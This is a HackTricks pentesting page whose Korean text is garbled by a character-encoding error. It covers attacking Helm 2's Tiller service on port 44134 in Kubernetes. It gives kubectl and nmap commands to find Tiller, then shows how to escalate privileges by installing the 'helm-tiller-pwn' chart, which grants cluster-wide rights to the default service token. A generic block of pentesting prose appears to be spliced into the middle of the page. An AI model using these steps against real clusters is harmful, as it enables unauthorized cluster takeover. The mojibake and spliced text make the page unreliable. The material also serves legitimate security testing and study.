<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


# ê¸°ë³¸ ì •ë³´

Helmì€ Kubernetesì˜ **íŒ¨í‚¤ì§€ ë§¤ë‹ˆì €**ì…ë‹ˆë‹¤. YAML íŒŒì¼ì„ íŒ¨í‚¤ì§€í™”í•˜ì—¬ ê³µê°œ ë° ë¹„ê³µê°œ ì €ì¥ì†Œì—ì„œ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ íŒ¨í‚¤ì§€ë¥¼ **Helm Charts**ë¼ê³  í•©ë‹ˆë‹¤. **Tiller**ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í¬íŠ¸ 44134ì—ì„œ ì‹¤í–‰ë˜ëŠ” **ì„œë¹„ìŠ¤**ì…ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# ì—´ê±°

ë§Œì•½ ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì˜ íŒŸê³¼/ë˜ëŠ” ì„œë¹„ìŠ¤ë¥¼ **ì—´ê±°í•  ìˆ˜ ìˆë‹¤ë©´**, ì—´ê±°í•˜ê³  ê·¸ ì¤‘ì—ì„œ **ì´ë¦„ì— "tiller"ì´ í¬í•¨ëœ ê²ƒ**ì„ ì°¾ìœ¼ì„¸ìš”:
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
ì˜ˆì‹œ:

## Tiller and Helm

### Tiller

Tillerì€ Kubernetes í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ Helm ì°¨íŠ¸ë¥¼ ì„¤ì¹˜í•˜ê³  ê´€ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì„œë²„ êµ¬ì„± ìš”ì†Œì…ë‹ˆë‹¤. TillerëŠ” í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ì„ ë°›ì•„ë“¤ì´ê³  í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì°¨íŠ¸ë¥¼ ë¦´ë¦¬ìŠ¤í•˜ê³  ì—…ë°ì´íŠ¸í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤.

TillerëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ê¶Œí•œ ë¶€ì—¬ë˜ì§€ ì•Šì€ ìƒíƒœë¡œ ì„¤ì¹˜ë˜ë©°, í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì‹¤í–‰ë˜ëŠ” ëª¨ë“  ì‘ì—…ì— ëŒ€í•œ ê¶Œí•œì„ ê°€ì§€ê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ì ì¬ì ìœ¼ë¡œ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Helm

Helmì€ Kubernetes ì• í”Œë¦¬ì¼€ì´ì…˜ì„ íŒ¨í‚¤ì§•í•˜ê³  ë°°í¬í•˜ê¸° ìœ„í•œ íŒ¨í‚¤ì§€ ê´€ë¦¬ìì…ë‹ˆë‹¤. Helmì€ ì°¨íŠ¸ë¼ëŠ” íŒ¨í‚¤ì§€ í˜•ì‹ì„ ì‚¬ìš©í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì„¤ì¹˜í•˜ê³  ì—…ê·¸ë ˆì´ë“œí•˜ë©°, ì´ë¥¼ í†µí•´ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë°°í¬ë¥¼ ìë™í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Helmì€ Tillerì™€ í•¨ê»˜ ì‚¬ìš©ë˜ë©°, Tillerë¥¼ í†µí•´ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì°¨íŠ¸ë¥¼ ê´€ë¦¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ Tillerì˜ ë³´ì•ˆ ì·¨ì•½ì ì€ Helmì„ í†µí•´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Tiller and Helm Pentesting

Tillerì™€ Helmì€ Kubernetes í™˜ê²½ì—ì„œ ì¤‘ìš”í•œ ì—­í• ì„ ìˆ˜í–‰í•˜ë¯€ë¡œ, ì´ë“¤ì˜ ë³´ì•ˆ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ëŠ” ê²ƒì€ ì¤‘ìš”í•©ë‹ˆë‹¤. Tillerì™€ Helmì„ íœí…ŒìŠ¤íŒ…í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ê¸°ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- Tiller ì„œë²„ì˜ ì·¨ì•½í•œ ë²„ì „ ì‹ë³„
- Tiller ì„œë²„ì˜ ê¶Œí•œ ìƒìŠ¹ ê³µê²©
- Tiller ì„œë²„ì˜ ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ êµ¬ì„± ê²€ì‚¬
- Tiller ì„œë²„ì˜ ë¦´ë¦¬ìŠ¤ ì •ë³´ ë…¸ì¶œ ê²€ì‚¬
- Tiller ì„œë²„ì˜ ë¦´ë¦¬ìŠ¤ ì—…ë°ì´íŠ¸ ë° ì‚­ì œ ê³µê²©
- Helm í´ë¼ì´ì–¸íŠ¸ì˜ êµ¬ì„± íŒŒì¼ ë¶„ì„ ë° ì•…ìš©

ì´ëŸ¬í•œ ê¸°ë²•ì„ ì‚¬ìš©í•˜ì—¬ Tillerì™€ Helmì˜ ë³´ì•ˆ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³ , ì ì ˆí•œ ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
ì´ ì„œë¹„ìŠ¤ë¥¼ ì°¾ê¸° ìœ„í•´ 44134 í¬íŠ¸ë¥¼ í™•ì¸í•´ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
sudo nmap -sS -p 44134 <IP>
```
ë°œê²¬í•œ í›„ì—ëŠ” í´ë¼ì´ì–¸íŠ¸ helm ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë‹¤ìš´ë¡œë“œí•˜ì—¬ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `homebrew`ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ [**ê³µì‹ ë¦´ë¦¬ìŠ¤ í˜ì´ì§€**](https://github.com/helm/helm/releases)**ë¥¼** ì°¸ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì´ë‚˜ ë‹¤ë¥¸ ì˜µì…˜ì€ [ì„¤ì¹˜ ê°€ì´ë“œ](https://v2.helm.sh/docs/using\_helm/#installing-helm)ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

ê·¸ëŸ° ë‹¤ìŒ, **ì„œë¹„ìŠ¤ë¥¼ ì—´ê±°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
helm --host tiller-deploy.kube-system:44134 version
```
## ê¶Œí•œ ìƒìŠ¹

ê¸°ë³¸ì ìœ¼ë¡œ **Helm2**ëŠ” **kube-system** ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— **ë†’ì€ ê¶Œí•œ**ìœ¼ë¡œ ì„¤ì¹˜ë˜ì–´ ìˆìœ¼ë¯€ë¡œ, ì„œë¹„ìŠ¤ë¥¼ ì°¾ê³  ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë‹¤ë©´ ì´ë¥¼ í†µí•´ **ê¶Œí•œì„ ìƒìŠ¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•´ë‹¹ íŒ¨í‚¤ì§€ë¥¼ ì„¤ì¹˜í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn). ì´ íŒ¨í‚¤ì§€ëŠ” **ê¸°ë³¸ ì„œë¹„ìŠ¤ í† í°ì´ í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°–ê²Œ** í•´ì¤ë‹ˆë‹¤.
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
[http://rui0.cn/archives/1573](http://rui0.cn/archives/1573)ì—ì„œëŠ” **ê³µê²©ì— ëŒ€í•œ ì„¤ëª…**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ, _helm-tiller-pwn/pwnchart/templates/_ í´ë” ì•ˆì˜ [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) ë° [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) íŒŒì¼ì„ ì½ìœ¼ë©´ **ëª¨ë“  ê¶Œí•œì´ ê¸°ë³¸ í† í°ì—ê²Œ ë¶€ì—¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
